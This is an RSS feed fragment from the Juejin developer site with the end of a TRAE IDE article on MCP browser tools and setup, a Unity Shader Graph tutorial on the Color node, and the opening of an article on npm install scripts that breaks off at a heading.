Vital（CWV）分数。</td></tr><tr><td>performance_stop_trace</td><td>在所选中页面上，停止活跃的性能追踪记录。</td></tr><tr><td>press_key</td><td>按下某个按键或组合键。当无法使用其他输入方式（如 fill（））时使用（例如键盘快捷键、导航键或特殊组合键）。</td></tr><tr><td>resize_page</td><td>调整所选中页面的窗口的大小，使页面具有指定的尺寸。</td></tr><tr><td>select_page</td><td>选择一个页面，作为后续工具调用的上下文。</td></tr><tr><td>take_screenshot</td><td>对页面或元素进行截图。</td></tr><tr><td>take_snapshot</td><td>基于 a11y（Accessibility）树，对当前选中的页面生成文本快照。快照会列出页面元素及其唯一标识（uid）。始终使用最新快照。相比截图，优先使用快照。快照会指示 DevTools Elements 面板中选中的元素（如果有）。</td></tr><tr><td>upload_file</td><td>选择一个页面，作为后续工具调用的上下文。</td></tr><tr><td>upload_file</td><td>通过提供的元素上传文件。</td></tr><tr><td>wait_for</td><td>等待指定文本出现在选中的页面上。</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1861608f453649be9e53b6142e2e49c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=amcewIZtTIa%2FpdR2K0JS2qUdJcE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-43"><strong>如何添加这些 MCP Server？</strong></h2>
<p>你可以直接从 TRAE IDE 内置的 MCP 市场添加。</p>
<p><strong>1.</strong> 进入 MCP 设置中心：</p>
<ul>
<li><strong>IDE 模式：</strong> 在 IDE 模式界面中，点击界面右上角的 <strong>设置</strong> 图标，进入设置中心。</li>
<li><strong>SOLO 模式：</strong> 在 SOLO 模式界面中，点击对话面板右上角的 <strong>设置</strong> 图标，进入设置中心。</li>
</ul>
<p><strong>2.</strong> 在左侧导航栏中，选择 <strong>MCP</strong>，打开 <strong>MCP</strong> 窗口。</p>
<p><strong>3.</strong> 在 <strong>MCP</strong> 窗口的右上角，点击 <strong>添加 &gt; 从市场添加</strong>。若你是首次添加 MCP Server，还可以直接点击窗口中部的 <strong>从市场添加</strong> 按钮。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e2e829c59714626bed61115f92a321b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=jZ72Xag2td7vpEScDlvO3cCOVuY%3D" alt="微信图片_20260114153022_1702.jpg" loading="lazy"/></p>
<p><strong>4.</strong> 在 MCP 市场中找到所需的 MCP Server。</p>
<p><strong>5.</strong> 点击右侧的 <strong>+</strong> 按钮。</p>
<p><strong>6.</strong> 在弹窗中填入 MCP Server 的配置信息。</p>
<ul>
<li>
<p>对于标记为 “Local” 的 MCP Server，需要在本地安装 NPX 或 UVX 后才能使用。</p>
</li>
<li>
<p>配置内容中的 env 信息（例如 API Key、Token、Access Key 等字段）需替换为真实信息。</p>
</li>
</ul>
<p><strong>7.</strong> 点击 <strong>确认</strong> 按钮，即代表配置成功。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9acf8b70ed664ababdc5fe1ae2523bf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=azSnpL3ui2VlThyey0MYpC%2BKfmk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-44"><strong>结语</strong></h2>
<p>以上是在 TRAE IDE 中的 10个 热门 MCP Server 的详细介绍，快来立即体验使用吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【节点】[Color节点]原理解析与实际应用]]></title>    <link>https://juejin.cn/post/7594859060858437642</link>    <guid>https://juejin.cn/post/7594859060858437642</guid>    <pubDate>2026-01-14T07:36:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594859060858437642" data-draft-id="7594859060858241034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【节点】[Color节点]原理解析与实际应用"/> <meta itemprop="keywords" content="游戏开发,图形学,Unity3D"/> <meta itemprop="datePublished" content="2026-01-14T07:36:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【节点】[Color节点]原理解析与实际应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:36:20.000Z" title="Wed Jan 14 2026 07:36:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong></p>
</blockquote>
<p>Color节点是Shader Graph中最基础且使用频率最高的节点之一，它用于定义和输出颜色值。在视觉着色器开发过程中，Color节点扮演着色彩定义的核心角色，无论是设置物体表面颜色、调整光照反射率，还是创建复杂的材质效果，都离不开对颜色的精确控制。</p>
<h2 data-id="heading-0">节点基本属性</h2>
<p><img src="https://docs.unity.cn/cn/Packages-cn/com.unity.shadergraph@14.0/manual/images/ColorNodeThumb.png" alt="" loading="lazy"/></p>
<p>Color节点提供了一个直观的颜色选择界面，让开发者能够轻松定义所需的颜色值。该节点输出一个四维向量（Vector 4），分别对应颜色的红（R）、绿（G）、蓝（B）和透明度（A）通道。</p>
<p>在Shader Graph工作区中，Color节点通常显示为一个带有颜色预览的小方块，右侧有一个输出端口。双击节点或点击颜色预览区域可以打开颜色选择器，进行精确的颜色调整。</p>
<h3 data-id="heading-1">颜色模式详解</h3>
<p>Color节点支持两种不同的颜色模式，这两种模式对应着不同的颜色处理流程和视觉效果：</p>
<ul>
<li>Default模式：在此模式下，颜色值被视为sRGB空间中的值。当在Gamma颜色空间中进行渲染时，这些值会被直接使用；而当在Linear颜色空间中进行渲染时，它们会被自动转换为线性值。这种自动转换确保了颜色在不同渲染环境下的一致性，是大多数标准材质颜色的理想选择。</li>
<li>HDR模式：高动态范围模式允许颜色值超过传统的0-1范围，特别适用于发光表面、自发光材质和后期处理效果。HDR颜色能够表示比白色更亮的颜色值，为Bloom、泛光等特效提供了必要的亮度信息。当使用HDR模式时，颜色选择器会显示额外的亮度控制滑块，允许定义超过1的亮度值。</li>
</ul>
<h2 data-id="heading-2">控件参数详解</h2>
<h3 data-id="heading-3">颜色选择器功能</h3>
<p>Color节点的核心控件是一个功能完整的颜色选择器，提供了多种颜色定义方式：</p>
<ul>
<li>可视化选取：通过色相环和亮度/饱和度方块进行直观的颜色选择</li>
<li>数值输入：支持RGB（0-255或0-1）、HSV和十六进制颜色代码输入</li>
<li>颜色预设：可以保存和调用常用颜色，提高工作效率</li>
<li>透明度控制：通过Alpha滑块或数值输入控制颜色的不透明度</li>
</ul>
<h3 data-id="heading-4">模式选择策略</h3>
<p>选择合适的颜色模式对于实现预期的视觉效果至关重要：</p>
<ul>
<li>对于漫反射颜色、基础色调和大多数表面属性，应使用Default模式</li>
<li>对于自发光材质、灯光效果、粒子系统和需要Bloom效果的表面，应使用HDR模式</li>
<li>在URP中，HDR颜色通常与后期处理的Bloom效果配合使用，创建出明亮的发光效果</li>
</ul>
<h2 data-id="heading-5">端口特性分析</h2>
<p>Color节点的输出端口设计简洁但功能强大：</p>
<ul>
<li>输出类型：Vector 4（四维向量）</li>
<li>数据范围：在Default模式下，各通道通常为0-1；在HDR模式下，RGB通道可以超过1</li>
<li>通道对应：输出向量的四个分量分别对应R、G、B、A通道</li>
</ul>
<h3 data-id="heading-6">输出数据应用</h3>
<p>Color节点的输出可以连接到Shader Graph中的几乎所有输入端口，包括：</p>
<ul>
<li>表面基础颜色</li>
<li>发射颜色</li>
<li>透明度值</li>
<li>其他需要颜色输入的节点参数</li>
</ul>
<h2 data-id="heading-7">生成的代码解析</h2>
<p>Color节点生成的代码反映了Unity的颜色管理策略，特别是颜色空间的自动处理：</p>
<pre><code class="hljs language-scss" lang="scss">HLSL

float4 _Color = <span class="hljs-built_in">IsGammaSpace</span>() ? <span class="hljs-built_in">float4</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>) : <span class="hljs-built_in">float4</span>(<span class="hljs-built_in">SRGBToLinear</span>(<span class="hljs-built_in">float3</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)), <span class="hljs-number">4</span>);
</code></pre>
<p>这段代码展示了Unity如何根据当前的颜色空间自动处理颜色值：</p>
<ul>
<li>在Gamma颜色空间中，颜色值被直接使用</li>
<li>在Linear颜色空间中，RGB值会通过SRGBToLinear函数进行转换，确保颜色计算的物理准确性</li>
<li>这种自动转换保证了着色器在不同项目设置下的一致性</li>
</ul>
<h3 data-id="heading-8">代码生成机制</h3>
<p>理解生成的代码有助于调试复杂的着色器问题：</p>
<ul>
<li>条件编译确保颜色空间正确的处理</li>
<li>SRGBToLinear函数应用了标准的sRGB到线性空间的转换公式</li>
<li>Alpha通道通常不受颜色空间转换影响，保持原值</li>
</ul>
<h2 data-id="heading-9">实际应用场景</h2>
<h3 data-id="heading-10">基础材质着色</h3>
<p>Color节点最基本的应用是定义物体的表面颜色：</p>
<ul>
<li>连接到主节点的Base Color输入，定义材质的基础色调</li>
<li>与其他纹理节点结合使用，实现色彩叠加和混合效果</li>
<li>通过透明度通道控制材质的透明程度</li>
</ul>
<h3 data-id="heading-11">HDR效果实现</h3>
<p>使用HDR模式的Color节点可以创建各种高动态范围视觉效果：</p>
<ul>
<li>自发光表面：将HDR颜色连接到Emission输入，创建发光材质</li>
<li>Bloom效果源：明亮的HDR颜色会自动触发URP的Bloom后期处理</li>
<li>场景灯光模拟：使用HDR颜色模拟强光源和反射表面</li>
</ul>
<h3 data-id="heading-12">色彩混合与调制</h3>
<p>Color节点经常与其他节点结合使用，实现复杂的色彩效果：</p>
<ul>
<li>与Sample Texture 2D节点相乘，实现纹理着色</li>
<li>与Lerp节点配合，实现颜色间的平滑过渡</li>
<li>通过Time节点动态改变颜色值，创建动画效果</li>
</ul>
<h2 data-id="heading-13">高级使用技巧</h2>
<h3 data-id="heading-14">色彩空间意识</h3>
<p>在使用Color节点时，理解色彩空间的影响至关重要：</p>
<ul>
<li>在Linear颜色空间项目中，颜色计算更加物理准确</li>
<li>Gamma颜色空间中的颜色值需要转换才能正确参与光照计算</li>
<li>Color节点的自动转换机制简化了这一过程，但了解原理有助于调试</li>
</ul>
<h3 data-id="heading-15">性能优化考虑</h3>
<p>合理使用Color节点有助于优化着色器性能：</p>
<ul>
<li>避免在片段着色器中使用复杂的颜色计算，尽量在顶点着色器或常量中定义</li>
<li>对于静态颜色，考虑使用Material Property而不是复杂的节点网络</li>
<li>HDR颜色会增加片元着色器的计算负担，应适度使用</li>
</ul>
<h3 data-id="heading-16">与其他节点配合</h3>
<p>Color节点可以与多种其他Shader Graph节点结合，创建复杂效果：</p>
<ul>
<li>与Math节点结合，实现程序化颜色生成</li>
<li>与Gradient节点配合，创建平滑的颜色渐变</li>
<li>与Noise节点结合，生成自然的外观变化</li>
</ul>
<h2 data-id="heading-17">常见问题与解决方案</h2>
<h3 data-id="heading-18">颜色显示不一致</h3>
<p>在不同设备或渲染环境下颜色显示不一致是常见问题：</p>
<ul>
<li>确保正确理解和使用颜色模式</li>
<li>检查项目的颜色空间设置</li>
<li>验证显示设备的色彩校准情况</li>
</ul>
<h3 data-id="heading-19">HDR效果不明显</h3>
<p>当HDR颜色没有产生预期的发光效果时：</p>
<ul>
<li>检查URP渲染器设置中的Bloom后期处理是否启用</li>
<li>验证HDR颜色的亮度值是否足够高（通常需要超过1）</li>
<li>确认材质表面的Emission强度设置</li>
</ul>
<h3 data-id="heading-20">性能问题排查</h3>
<p>如果着色器出现性能问题：</p>
<ul>
<li>检查是否不必要地使用了HDR颜色</li>
<li>验证颜色计算是否可以在更早的着色阶段完成</li>
<li>考虑使用更简单的颜色表示方法</li>
</ul>
<h2 data-id="heading-21">最佳实践建议</h2>
<p>根据项目需求和工作流程，以下Color节点的使用建议值得参考：</p>
<ul>
<li>在项目早期确定颜色管理策略，并保持一致性</li>
<li>使用有意义的命名规范区分Default和HDR颜色节点</li>
<li>建立颜色预设库，保持项目视觉风格的一致性</li>
<li>定期在不同设备和光照环境下测试颜色表现</li>
<li>文档化复杂的颜色配置，便于团队协作和后期维护</li>
</ul>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong>
（欢迎<em>点赞留言</em>探讨，更多人加入进来能更加完善这个探索的过程，🙏）</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[装个依赖把公司电脑干报废了？npm i 到底背着我干了啥？]]></title>    <link>https://juejin.cn/post/7594835618119794728</link>    <guid>https://juejin.cn/post/7594835618119794728</guid>    <pubDate>2026-01-14T07:37:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594835618119794728" data-draft-id="7591382440582709288" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="装个依赖把公司电脑干报废了？npm i 到底背着我干了啥？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T07:37:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端九哥"/> <meta itemprop="url" content="https://juejin.cn/user/3659622444970574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            装个依赖把公司电脑干报废了？npm i 到底背着我干了啥？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3659622444970574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端九哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:37:21.000Z" title="Wed Jan 14 2026 07:37:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>“我就 npm i 一下，风扇狂转、CPU 拉满、终端卡死、VPN 掉线……”</strong></p>
<p>你一脸懵逼：
👉 <em>我到底装的是依赖，还是在电脑里放了个核反应堆？</em> ☢️</p>
</blockquote>
<p>别慌。
这事儿，<strong>npm 真干得出来。</strong></p>
<p>今天我们就来扒一扒，当你敲下回车的那一刻，你的电脑到底经历了什么。</p>
<h2 data-id="heading-0"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/620f8974c4bf42a28d34053e81cbe578~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Lmd5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768981041&amp;x-signature=QJuBi25St1Czil4i9vKaisqmq8A%3D" alt="O3251.gif" loading="lazy"/></h2>
<h2 data-id="heading-1">💬 引言：npm i ≠ 下载几个包这么简单</h2>
<p>很多人（包括曾经的我）以为：</p>
<pre><code class="hljs language-bash" lang="bash">npm install
</code></pre>
<p>它的工作流程只是：</p>
<blockquote>
<p>📦 联网下载依赖 → 📂 解压到 node_modules → ✅ 完事</p>
</blockquote>
<p>但<strong>真实流程</strong>更像这样👇</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb7d19afdfa44cb28afc2106a53bc99b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5Lmd5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768981041&amp;x-signature=ddfMIJJH%2Boc5QD2N%2BW9JMxL7TTo%3D" alt="image.png" loading="lazy"/></p>
<p>一句话总结：</p>
<blockquote>
<p><strong>npm install 是一个“默认允许第三方包在你的电脑上执行任意代码”的操作。</strong></p>
</blockquote>
<p>是的，<strong>任意代码。</strong></p>
<hr/>
<h2 data-id="heading-2">🧠 真正的幕后黑手：npm scripts</h2>
<h3 data-id="heading-3">👿 package.json 里最容易被忽略的一块</h3>
